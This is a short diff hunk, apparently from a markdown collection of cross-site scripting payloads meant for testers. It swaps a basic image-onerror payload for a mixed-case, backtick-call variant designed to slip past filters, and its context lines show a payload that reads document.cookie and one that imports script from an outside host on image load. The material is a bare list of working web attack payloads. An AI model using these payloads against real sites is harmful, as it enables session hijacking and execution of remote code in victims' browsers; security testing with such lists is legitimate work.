@@ -32,7 +32,7 @@ The payloads are organized to help testers quickly validate:
 "><img src=e onerror=confirm(document.cookie)>"/>
 ```
 ```
-<img src=x onerror=alert(1)>
+<img src=1 oNeRrOr=alert`1`>
 ```
 ```
 <Img Src=//X55.is OnLoad=import(src)>
